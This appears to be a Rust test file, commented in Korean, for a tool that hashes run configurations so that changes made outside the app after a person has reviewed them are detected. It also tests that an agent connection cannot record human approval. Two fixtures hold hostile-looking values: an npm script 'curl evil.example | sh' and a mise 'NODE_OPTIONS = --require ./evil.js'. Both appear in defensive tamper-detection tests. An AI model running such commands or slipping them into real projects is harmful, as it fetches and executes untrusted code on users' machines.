//! 「사람이 본 구성」(17-m6-plan M6-11)의 완료 기준 ① · ② · ③ · ⑤ 와 워크트리 · 빠진 정의.
//!
//! env 를 푸는 것(M6-03)과 명령 정의 본문을 읽는 것(M6-04 · 05)은 아직 이 크레이트에 없어, 시험은 그 둘을 작은 가짜로 채운다
//! ([`Fixture::seen`]) — 이 모듈이 받는 것은 푼 결과뿐이라 가짜가 무엇을 푸는지는 판정과 상관없다.

use std::collections::BTreeMap;
use std::fs;
use std::path::{Path, PathBuf};

use pw_core::bus::{DEFAULT_CAPACITY, EventBus};
use pw_core::config::AppPaths;
use pw_core::registry::run_seen::{SeenBy, SeenPlace};
use pw_core::registry::{NewProject, Project, Registry};
use pw_rpc::{ConnectionScope, code};

use super::*;
use crate::config::argv::{ArgvContext, argv};
use crate::config::{RunConfigPlace, read, root};

struct Fixture {
    _tmp: tempfile::TempDir,
    /// 임시 폴더(실제 경로). 런타임 원천 파일 찾기가 이 앞에서 멈춘다(홈 폴더 자리).
    base: PathBuf,
    paths: AppPaths,
    registry: Registry,
    project: Project,
    root: PathBuf,
}

impl Fixture {
    fn new() -> Self {
        let tmp = tempfile::tempdir().unwrap();
        let base = fs::canonicalize(tmp.path()).unwrap();
        let root = base.join("proj");
        fs::create_dir_all(&root).unwrap();
        let paths = AppPaths::under(&base.join("app"));
        let registry = Registry::new(paths.clone(), None, EventBus::new(DEFAULT_CAPACITY));
        let project = registry
            .create(NewProject {
                root: root.clone(),
                ..NewProject::default()
            })
            .unwrap();
        registry.set_trust(&project.id, true).unwrap();
        Self {
            _tmp: tmp,
            base,
            paths,
            registry,
            project,
            root,
        }
    }

    fn write(&self, rel: &str, text: &str) {
        let path = self.root.join(rel);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        fs::write(path, text).unwrap();
    }

    /// 디스크의 구성 `id` 를 읽고 풀어 해시한다 — 실행을 띄우는 쪽이 하는 것과 같은 차례(읽기 → argv → env → 정의 → 해시).
    fn seen(&self, id: &str, profile: Option<&str>) -> SeenHash {
        seen_at(&self.paths, &self.project, &self.base, None, id, profile)
    }

    /// 사람이 화면에서 저장 · 실행한 것처럼 그 프로젝트 창의 연결로 기록한다.
    fn record(&self, id: &str, hash: SeenHash, place: SeenPlace) {
        let by = SeenBy::window(
            &ConnectionScope::Project(self.project.id.clone()),
            &self.project.id,
            place,
        )
        .unwrap();
        self.registry
            .record_run_seen(&by, &[(id.to_owned(), hash)])
            .unwrap();
    }

    fn saw(&self, id: &str, hash: &SeenHash) -> bool {
        self.registry.human_saw(&self.project.id, id, hash)
    }
}

fn seen_at(
    paths: &AppPaths,
    project: &Project,
    home: &Path,
    worktree: Option<&str>,
    id: &str,
    profile: Option<&str>,
) -> SeenHash {
    let place = RunConfigPlace::new(paths, project, worktree).unwrap();
    let set = read(&place);
    let loaded = set
        .get(id)
        .unwrap_or_else(|| panic!("`{id}` unusable: {:?}", set.unusable));
    let config = &loaded.config;
    let cwd = match &config.cwd {
        Some(rel) => root::inside(&place.root, rel).unwrap(),
        None => place.root.clone(),
    };
    let login_shell = ["/bin/sh".to_owned(), "-l".to_owned()];
    let argv = argv(
        config,
        profile,
        &ArgvContext {
            root: &place.root,
            cwd: &cwd,
            login_shell: &login_shell,
        },
    )
    .unwrap();
    // M6-03 의 가짜: env_file(순서대로) → env → 프로필 env.
    let files: Vec<(String, Option<Vec<u8>>)> = config
        .env_file
        .iter()
        .map(|rel| (rel.clone(), fs::read(place.root.join(rel)).ok()))
        .collect();
    let mut env = BTreeMap::new();
    for (_, bytes) in &files {
        for line in String::from_utf8_lossy(bytes.as_deref().unwrap_or_default()).lines() {
            if let Some((k, v)) = line.split_once('=') {
                env.insert(k.trim().to_owned(), v.trim().to_owned());
            }
        }
    }
    env.extend(config.env.clone());
    if let Some(p) = profile {
        env.extend(config.profiles[p].env.clone());
    }
    // M6-04 의 가짜: npm 은 package.json 의 그 script 본문.
    let definition = match &config.kind {
        RunKindConfig::Npm { script } => {
            let manifest: serde_json::Value =
                serde_json::from_slice(&fs::read(cwd.join("package.json")).unwrap()).unwrap();
            manifest["scripts"][script].as_str().map(str::to_owned)
        }
        RunKindConfig::MiseTask { task } => Some(format!("echo {task}")),
        _ => None,
    };
    let reads: Vec<EnvFileRead<'_>> = files
        .iter()
        .map(|(path, bytes)| EnvFileRead {
            path,
            contents: bytes.as_deref(),
        })
        .collect();
    hash(&SeenParts {
        key: id,
        root: &place.root,
        config,
        profile,
        argv: &argv,
        cwd: &cwd,
        home: Some(home),
        env: &env,
        env_files: &reads,
        definition: definition.as_deref(),
    })
    .unwrap()
}

const DEV: &str = r#"schema = 1
# 개발 서버
name = "Dev"
type = "cargo"
command = "run"
args = ["--bin", "server"]
env = { RUST_LOG = "info", PORT = "8080" }
env_file = [".env.local"]

[profiles.verbose]
env = { RUST_LOG = "debug" }

[debug]
mode = "launch"
"#;

/// ① 화면에서 저장한 구성은 기록되고(다시 읽어도 같다), 파일을 밖에서 한 글자 고치면 기록과 다르다 — 수정 시각 · 구성 id 로만
/// 보면 실패한다.
#[test]
fn a_saved_config_is_seen_until_one_character_changes_outside() {
    let f = Fixture::new();
    f.write(".pitwall/run/dev.toml", DEV);
    f.write(".env.local", "DB_HOST=localhost\n");
    let saved = f.seen("dev", None);
    f.record("dev", saved.clone(), SeenPlace::Save);
    assert!(f.saw("dev", &f.seen("dev", None)), "다시 읽은 같은 내용");

    // 한 글자(`8080` → `8081`). 같은 id · 같은 이름이다.
    f.write(".pitwall/run/dev.toml", &DEV.replace("8080", "8081"));
    assert!(!f.saw("dev", &f.seen("dev", None)));
    // 되돌리면 다시 본 것이다(수정 시각이 아니라 내용).
    f.write(".pitwall/run/dev.toml", DEV);
    assert!(f.saw("dev", &f.seen("dev", None)));
}

/// ② 주석 · 공백 · 키 순서 · 인라인 표와 `[env]` 표의 차이만 바꾼 것은 같은 해시다.
#[test]
fn comments_whitespace_and_key_order_do_not_change_the_hash() {
    let f = Fixture::new();
    f.write(".pitwall/run/dev.toml", DEV);
    let before = f.seen("dev", None);
    f.write(
        ".pitwall/run/dev.toml",
        r#"schema = 1
type   = "cargo"      # 종류
name = "Dev"
env_file = [ ".env.local" ]
command = "run"
args = [
  "--bin",
  "server",
]

# 프로필
[profiles.verbose.env]
RUST_LOG = "debug"

[env]
PORT = "8080"
RUST_LOG = "info"

[debug]
mode = "launch"
"#,
    );
    assert_eq!(f.seen("dev", None), before);
}

/// ⑤ `env` 의 값 하나 · `.env.local` 한 줄 · `package.json` 의 그 script 본문만 바꿔도 기록과 다르다(이름만 해시하면 실패).
/// 구성의 `[debug]` 와 고른 프로필도 해시에 든다.
#[test]
fn values_env_files_and_definitions_are_part_of_the_hash() {
    let f = Fixture::new();
    f.write(".pitwall/run/dev.toml", DEV);
    f.write(".env.local", "DB_HOST=localhost\nDB_PASSWORD=one\n");
    f.write(
        ".pitwall/run/web.toml",
        "schema = 1\nname = \"Web\"\ntype = \"npm\"\nscript = \"dev\"\n",
    );
    f.write(
        "package.json",
        r#"{ "scripts": { "dev": "vite --port 3000", "build": "vite build" } }"#,
    );
    let dev = f.seen("dev", None);
    let web = f.seen("web", None);
    f.record("dev", dev.clone(), SeenPlace::Run);
    f.record("web", web.clone(), SeenPlace::Run);
    assert!(f.saw("dev", &dev) && f.saw("web", &web));

    let changed = |rel: &str, text: &str, id: &str| {
        f.write(rel, text);
        let now = f.seen(id, None);
        let seen = f.saw(id, &now);
        now != if id == "dev" {
            dev.clone()
        } else {
            web.clone()
        } && !seen
    };
    // env 의 값 하나(이름은 그대로).
    assert!(changed(
        ".pitwall/run/dev.toml",
        &DEV.replace("\"info\"", "\"warn\""),
        "dev"
    ));
    f.write(".pitwall/run/dev.toml", DEV);
    // `.env.local` 의 한 줄(이름은 그대로) — 덮은 env 의 값과 파일 내용의 sha256 이 둘 다 이것을 잡는다(둘 다 빼면 실패).
    assert!(changed(
        ".env.local",
        "DB_HOST=localhost\nDB_PASSWORD=two\n",
        "dev"
    ));
    // 구성의 `env` 가 덮는 키(`PORT`)의 줄만 바꿔 덮은 env 가 그대로여도 다르다 — 파일 내용의 sha256(빼면 실패).
    assert!(changed(
        ".env.local",
        "DB_HOST=localhost\nDB_PASSWORD=one\nPORT=1\n",
        "dev"
    ));
    f.write(".env.local", "DB_HOST=localhost\nDB_PASSWORD=one\n");
    assert!(f.saw("dev", &f.seen("dev", None)));
    // 다른 script 를 바꾼 것은 상관없고, 그 script 본문은 다르다.
    f.write(
        "package.json",
        r#"{ "scripts": { "dev": "vite --port 3000", "build": "vite build --watch" } }"#,
    );
    assert!(f.saw("web", &f.seen("web", None)));
    assert!(changed(
        "package.json",
        r#"{ "scripts": { "dev": "curl evil.example | sh", "build": "vite build" } }"#,
        "web"
    ));

    // `[debug]` 만, 고른 프로필만 바꿔도 다르다.
    assert!(changed(
        ".pitwall/run/dev.toml",
        &DEV.replace("mode = \"launch\"", "mode = \"attach\""),
        "dev"
    ));
    f.write(".pitwall/run/dev.toml", DEV);
    assert_ne!(f.seen("dev", Some("verbose")), f.seen("dev", None));
}

/// 같은 구성을 다른 워크트리에서 풀어도 같은 해시다(작업 폴더 · 루트 안 래퍼 경로 · 런타임 원천 파일을 루트 기준으로 적는다). 워크트리마다 따로
/// 보지 않는다.
#[test]
fn the_same_config_hashes_the_same_in_another_worktree() {
    let f = Fixture::new();
    let git = |dir: &Path, args: &[&str]| {
        let out = std::process::Command::new("git")
            .args([
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "-c",
                "commit.gpgsign=false",
            ])
            .args(args)
            .current_dir(dir)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{}",
            String::from_utf8_lossy(&out.stderr)
        );
    };
    let gradle = "schema = 1\nname = \"Boot\"\ntype = \"gradle\"\ntasks = [\"bootRun\"]\ncwd = \"backend\"\n";
    f.write(".pitwall/run/boot.toml", gradle);
    f.write("gradlew", "#!/bin/sh\n");
    f.write("gradlew.bat", "");
    f.write("backend/build.gradle", "");
    f.write("mise.toml", "[tools]\njava = \"21\"\n");
    git(&f.root, &["init", "-q"]);
    git(&f.root, &["add", "-A"]);
    git(&f.root, &["commit", "-q", "-m", "init"]);
    let wt = f.root.parent().unwrap().join("proj-wt");
    git(&f.root, &["worktree", "add", "-q", wt.to_str().unwrap()]);
    let wt = fs::canonicalize(&wt).unwrap();

    let main = f.seen("boot", None);
    let other = seen_at(
        &f.paths,
        &f.project,
        &f.base,
        Some(wt.to_str().unwrap()),
        "boot",
        None,
    );
    assert_eq!(main, other);
}

/// 정의 본문이 있어야 하는 종류(`npm` · `mise-task` · 감지된 태스크)에 본문이 없으면 해시하지 않는다(부른 쪽은 「본 적 없음」 —
/// 묻는다). 읽은 `env_file` 이 구성의 목록과 다르거나 작업 폴더가 루트 밖이어도 그렇다. 오류 글에 값이 없다.
#[test]
fn missing_parts_are_refused_without_values_in_the_error() {
    let tmp = tempfile::tempdir().unwrap();
    let base = fs::canonicalize(tmp.path()).unwrap();
    let root = &base.join("p");
    fs::create_dir_all(root).unwrap();
    fs::create_dir_all(base.join("q")).unwrap();
    let up = root.join("../q");
    let sibling = base.join("q");
    let missing = root.join("missing");
    let npm = RunConfig {
        name: "Web".into(),
        kind: RunKindConfig::Npm {
            script: "dev".into(),
        },
        cwd: None,
        env: BTreeMap::from([("TOKEN".into(), "s3cret".into())]),
        env_file: vec![".env".into()],
        profiles: BTreeMap::new(),
        debug: None,
    };
    let env = npm.env.clone();
    let argv = vec!["npm".to_owned(), "run".to_owned(), "dev".to_owned()];
    let files = [EnvFileRead {
        path: ".env",
        contents: Some(b"TOKEN=s3cret"),
    }];
    let parts = |key, definition, env_files, cwd| SeenParts {
        key,
        root,
        config: &npm,
        profile: None,
        argv: &argv,
        cwd,
        home: Some(&base),
        env: &env,
        env_files,
        definition,
    };
    let ok = hash(&parts("web", Some("vite"), &files, root)).unwrap();
    assert!(ok.as_str().starts_with("sha256:"));
    for refused in [
        hash(&parts("web", None, &files, root)),
        hash(&parts("web", Some("vite"), &[], root)),
        hash(&parts("web", Some("vite"), &files, &sibling)),
        hash(&parts("web", Some("vite"), &files, &up)),
        hash(&parts("web", Some("vite"), &files, &missing)),
    ] {
        let why = refused.unwrap_err();
        assert!(!why.contains("s3cret") && !why.contains("vite"), "{why}");
    }
    assert!(needs_definition(
        &detected_key("make", "build"),
        &RunKindConfig::Shell {
            command: "make build".into()
        }
    ));
    assert!(!needs_definition(
        "dev",
        &RunKindConfig::Shell {
            command: "make build".into()
        }
    ));
    let debug = format!(
        "{:?}",
        content(&parts("web", Some("vite"), &files, root)).unwrap()
    );
    assert!(
        !debug.contains("s3cret") && !debug.contains("vite"),
        "{debug}"
    );
}

/// ③ 에이전트 범위(MCP 세션 — `run_config_upsert` 의 승인 뒤 쓰기가 도는 연결)는 기록 증거를 만들지 못한다 — 기록 함수를 부를
/// 길이 없다. 그래서 그 승인 뒤의 구성은 「본 적 없음」 이다.
#[test]
fn an_agent_connection_cannot_record_what_a_person_saw() {
    let f = Fixture::new();
    f.write(".pitwall/run/dev.toml", DEV);
    let hash = f.seen("dev", None);
    for place in [SeenPlace::Save, SeenPlace::Run, SeenPlace::Approval] {
        let refused = SeenBy::window(&ConnectionScope::Agent, &f.project.id, place).unwrap_err();
        assert_eq!(refused.code, code::PERMISSION_DENIED);
    }
    assert!(!f.saw("dev", &hash));
}

fn shell_parts<'a>(
    config: &'a RunConfig,
    root: &'a Path,
    cwd: &'a Path,
    home: &'a Path,
    env: &'a BTreeMap<String, String>,
) -> SeenParts<'a> {
    SeenParts {
        key: "dev",
        root,
        config,
        profile: None,
        argv: &[],
        cwd,
        home: Some(home),
        env,
        env_files: &[],
        definition: None,
    }
}

fn shell(command: &str) -> RunConfig {
    RunConfig {
        name: "Dev".into(),
        kind: RunKindConfig::Shell {
            command: command.into(),
        },
        cwd: None,
        env: BTreeMap::new(),
        env_file: Vec::new(),
        profiles: BTreeMap::new(),
        debug: None,
    }
}

/// 런타임 환경의 원천 파일도 해시에 든다(리뷰 F1 — D68): `mise.toml` 의 `[env]` 로 `NODE_OPTIONS` 를 넣거나, `.tool-versions` ·
/// `.nvmrc` 를 바꾸면 기록과 다르다. 작업 폴더의 위 폴더에 있는 것도 든다(mise 가 읽는다). 작업 폴더 위가 아닌 폴더의 mise
/// 파일 · 홈 폴더 앞(여기서는 임시 폴더) 밖의 것은 들지 않는다.
#[test]
fn runtime_source_files_are_part_of_the_hash() {
    let f = Fixture::new();
    f.write(
        ".pitwall/run/dev.toml",
        "schema = 1\nname = \"Dev\"\ntype = \"shell\"\ncommand = \"node server.js\"\ncwd = \"web\"\n",
    );
    fs::create_dir_all(f.root.join("web")).unwrap();
    f.write(
        "mise.toml",
        "[tools]\nnode = \"22\"\n[env]\nFOO = \"one\"\n",
    );
    f.write(".tool-versions", "node 22\n");
    f.write("web/.nvmrc", "22\n");
    let seen = f.seen("dev", None);
    f.record("dev", seen.clone(), SeenPlace::Run);

    let changed = |rel: &str, text: &str| {
        let before = fs::read(f.root.join(rel)).ok();
        f.write(rel, text);
        let now = f.seen("dev", None);
        match before {
            Some(bytes) => fs::write(f.root.join(rel), bytes).unwrap(),
            None => fs::remove_file(f.root.join(rel)).unwrap(),
        }
        assert!(f.saw("dev", &f.seen("dev", None)), "restored {rel}");
        now != seen && !f.saw("dev", &now)
    };
    assert!(changed(
        "mise.toml",
        "[tools]\nnode = \"22\"\n[env]\nFOO = \"one\"\nNODE_OPTIONS = \"--require ./evil.js\"\n"
    ));
    assert!(changed(".tool-versions", "node 20\n"));
    assert!(changed("web/.nvmrc", "20\n"));
    // 새로 생긴 파일(작업 폴더 안의 mise.local.toml, 환경 이름 붙은 mise.dev.toml).
    assert!(changed("web/mise.local.toml", "[env]\nFOO = \"two\"\n"));
    assert!(changed("mise.dev.toml", "[env]\nFOO = \"two\"\n"));
    // 작업 폴더 위가 아닌 폴더 · 런타임과 상관없는 파일은 들지 않는다.
    assert!(!changed("other/mise.toml", "[env]\nFOO = \"two\"\n"));
    assert!(!changed("web/README.md", "hello\n"));
}

/// 작업 폴더는 해시 함수가 실제 경로로 푼다(리뷰 F4): 부른 쪽이 링크 경로를 그대로 넘겨도 링크가 가리키는 폴더가 해시에 들고,
/// 밖을 가리키는 링크 · 없는 폴더는 해시하지 않는다.
#[cfg(unix)]
#[test]
fn the_working_directory_is_resolved_by_the_hash_itself() {
    let tmp = tempfile::tempdir().unwrap();
    let base = fs::canonicalize(tmp.path()).unwrap();
    let root = base.join("proj");
    for dir in ["b", "c"] {
        fs::create_dir_all(root.join(dir)).unwrap();
    }
    fs::create_dir_all(base.join("outside")).unwrap();
    let config = shell("make");
    let env = BTreeMap::new();
    let link = root.join("a");
    let at = |cwd: &Path| hash(&shell_parts(&config, &root, cwd, &base, &env));

    std::os::unix::fs::symlink(root.join("b"), &link).unwrap();
    let via_b = at(&link).unwrap();
    assert_eq!(via_b, at(&root.join("b")).unwrap());
    fs::remove_file(&link).unwrap();
    std::os::unix::fs::symlink(root.join("c"), &link).unwrap();
    let via_c = at(&link).unwrap();
    assert_eq!(via_c, at(&root.join("c")).unwrap());
    assert_ne!(via_b, via_c, "바꿔치기한 링크");
    fs::remove_file(&link).unwrap();
    std::os::unix::fs::symlink(base.join("outside"), &link).unwrap();
    assert!(at(&link).is_err(), "밖을 가리키는 링크");
    assert!(at(&root.join("missing")).is_err(), "없는 폴더");
}
